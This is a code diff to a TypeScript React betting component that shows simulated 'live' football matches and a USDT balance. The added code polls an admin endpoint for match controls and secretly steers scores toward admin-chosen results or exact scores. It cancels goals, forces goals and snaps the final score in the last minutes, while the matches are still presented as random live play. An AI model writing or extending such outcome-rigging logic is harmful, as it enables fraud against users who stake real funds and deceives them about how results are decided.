@@ -8,6 +8,12 @@ import { pickFreshMatchups, getLeague, ri, rf, type MatchTemplate } from '../lib
 interface Odds { w1: number; x: number; w2: number }
 interface TotalOdds { line: number; over: number; under: number }
 
+interface AdminCtrl {
+  targetResult?: '1' | 'X' | '2';
+  targetScore?: { h: number; a: number };
+  pinned: boolean;
+}
+
 type OddsDir = 'up' | 'down' | 'same';
 interface OddsDirs { w1: OddsDir; x: OddsDir; w2: OddsDir }
 
@@ -32,6 +38,7 @@ interface LiveMatch {
   flashTs: number;
   finishedAt: number | null;
   halfTimeScore?: { h: number; a: number };
+  adminCtrl?: AdminCtrl;
 }
 
 type BetType = string;
@@ -708,6 +715,7 @@ function MatchRow({
           display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
           borderRight: '1px solid #1C2128', padding: '5px 0', gap: 1,
         }}>
+          {m.adminCtrl?.pinned && <span style={{ fontSize: 8, lineHeight: 1 }}>📌</span>}
           <span style={{ fontSize: 10.5, color: '#ef4444', fontWeight: 900, lineHeight: 1 }}>{m.minute}'</span>
           <span style={{ fontSize: 7.5, color: '#374151', fontWeight: 700 }}>{halfLabel}</span>
         </div>
@@ -1037,6 +1045,7 @@ export default function GamesSection() {
   const notifTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
   const initialized = useRef(false);
   const topScrollRef = useRef<HTMLDivElement>(null);
+  const controlsRef = useRef<Map<string, AdminCtrl>>(new Map());
 
   /* Smooth continuous auto-scroll — pixel-by-pixel via RAF */
   useEffect(() => {
@@ -1082,6 +1091,32 @@ export default function GamesSection() {
     initialized.current = true;
     const templates = pickFreshMatchups(30);
     setMatches(templates.map((t, i) => buildMatch(t, i)));
+  }, []);
+
+  /* Poll admin match controls every 30s */
+  useEffect(() => {
+    async function fetchControls() {
+      try {
+        const res = await fetch('/api-server/api/admin/match-controls', { cache: 'no-store' });
+        if (!res.ok) return;
+        const data: Array<{ homeTeam: string; awayTeam: string; targetResult?: '1'|'X'|'2'; targetScore?: {h:number;a:number}; pinned: boolean }> = await res.json();
+        const map = new Map<string, AdminCtrl>();
+        for (const c of data) {
+          map.set(`${c.homeTeam}:${c.awayTeam}`, { targetResult: c.targetResult, targetScore: c.targetScore, pinned: c.pinned });
+        }
+        controlsRef.current = map;
+        // Assign/remove adminCtrl on existing matches without resetting any state
+        setMatches(prev => prev.map(m => {
+          const key = `${m.tmpl.homeTeam.name}:${m.tmpl.awayTeam.name}`;
+          const ctrl = map.get(key);
+          if (ctrl === m.adminCtrl) return m;
+          return { ...m, adminCtrl: ctrl };
+        }));
+      } catch {}
+    }
+    fetchControls();
+    const iv = setInterval(fetchControls, 30000);
+    return () => clearInterval(iv);
   }, []);
 
   /* Load USDT balance */
@@ -1165,25 +1200,68 @@ export default function GamesSection() {
 
           // Goal logic (~7% per tick)
           let scoringSide: 'home' | 'away' | undefined;
-          if (Math.random() < 0.07) {
-            scoringSide = Math.random() < 0.52 ? 'home' : 'away';
-            const newHome = scoringSide === 'home' ? mm.homeScore + 1 : mm.homeScore;
-            const newAway = scoringSide === 'away' ? mm.awayScore + 1 : mm.awayScore;
-            const totalGoals = newHome + newAway;
-            const newLine = totalGoals + 0.5 + (Math.random() < 0.35 ? 1 : 0);
-            const newTotalOdds: TotalOdds = {
-              line: newLine,
-              over:  +(rf(1.55, 2.90)).toFixed(2),
-              under: +(rf(1.55, 2.90)).toFixed(2),
-            };
-            mm = {
-              ...mm,
-              homeScore: newHome,
-              awayScore: newAway,
-              goalFlash: scoringSide,
-              flashTs: now,
-              totalOdds: newTotalOdds,
-            };
+
+          // ── Admin control steering ──────────────────────────
+          const ctrl = mm.adminCtrl;
+          if (ctrl) {
+            const minsLeft = 90 - mm.minute;
+            if (ctrl.targetScore !== undefined) {
+              const ts = ctrl.targetScore;
+              if (minsLeft <= 3) {
+                // Final minutes: snap to exact target
+                mm = { ...mm, homeScore: ts.h, awayScore: ts.a };
+              } else {
+                // Prevent going over target (cancel excess goals)
+                if (mm.homeScore > ts.h) mm = { ...mm, homeScore: mm.homeScore - 1 };
+                if (mm.awayScore > ts.a) mm = { ...mm, awayScore: mm.awayScore - 1 };
+                // Urgently nudge toward target
+                const need = Math.abs(ts.h - mm.homeScore) + Math.abs(ts.a - mm.awayScore);
+                const urgency = need / (minsLeft / 8 + 1);
+                if (urgency > 0.4) {
+                  if (mm.homeScore < ts.h) {
+                    scoringSide = 'home';
+                    mm = { ...mm, homeScore: mm.homeScore + 1, goalFlash: 'home', flashTs: now };
+                  } else if (mm.awayScore < ts.a) {
+                    scoringSide = 'away';
+                    mm = { ...mm, awayScore: mm.awayScore + 1, goalFlash: 'away', flashTs: now };
+                  }
+                }
+              }
+            } else if (ctrl.targetResult && minsLeft <= 3) {
+              // Result-only: force minimal score adjustment at end
+              const h = mm.homeScore, a = mm.awayScore;
+              if (ctrl.targetResult === '1' && h <= a) {
+                mm = { ...mm, homeScore: a + 1, goalFlash: 'home', flashTs: now };
+                scoringSide = 'home';
+              } else if (ctrl.targetResult === '2' && a <= h) {
+                mm = { ...mm, awayScore: h + 1, goalFlash: 'away', flashTs: now };
+                scoringSide = 'away';
+              } else if (ctrl.targetResult === 'X' && h !== a) {
+                mm = { ...mm, awayScore: h };
+              }
+            }
+          } else {
+            // Normal random goal logic (~7% per tick)
+            if (Math.random() < 0.07) {
+              scoringSide = Math.random() < 0.52 ? 'home' : 'away';
+              const newHome = scoringSide === 'home' ? mm.homeScore + 1 : mm.homeScore;
+              const newAway = scoringSide === 'away' ? mm.awayScore + 1 : mm.awayScore;
+              const totalGoals = newHome + newAway;
+              const newLine = totalGoals + 0.5 + (Math.random() < 0.35 ? 1 : 0);
+              const newTotalOdds: TotalOdds = {
+                line: newLine,
+                over:  +(rf(1.55, 2.90)).toFixed(2),
+                under: +(rf(1.55, 2.90)).toFixed(2),
+              };
+              mm = {
+                ...mm,
+                homeScore: newHome,
+                awayScore: newAway,
+                goalFlash: scoringSide,
+                flashTs: now,
+                totalOdds: newTotalOdds,
+              };
+            }
           }
 
           // Recalc result odds — big shift on goal, small drift every tick
@@ -1210,9 +1288,18 @@ export default function GamesSection() {
           const fresh = pickFreshMatchups(need, busyTeams);
           fresh.forEach(t => {
             counter.current++;
-            next.push(buildMatch(t, counter.current));
+            const nm = buildMatch(t, counter.current);
+            const key = `${t.homeTeam.name}:${t.awayTeam.name}`;
+            const ctrl = controlsRef.current.get(key);
+            next.push(ctrl ? { ...nm, adminCtrl: ctrl } : nm);
           });
         }
+        // Pinned matches always appear at the top
+        next.sort((a, b) => {
+          const ap = a.adminCtrl?.pinned ? 1 : 0;
+          const bp = b.adminCtrl?.pinned ? 1 : 0;
+          return bp - ap;
+        });
         return next;
       });
     }, 10000);
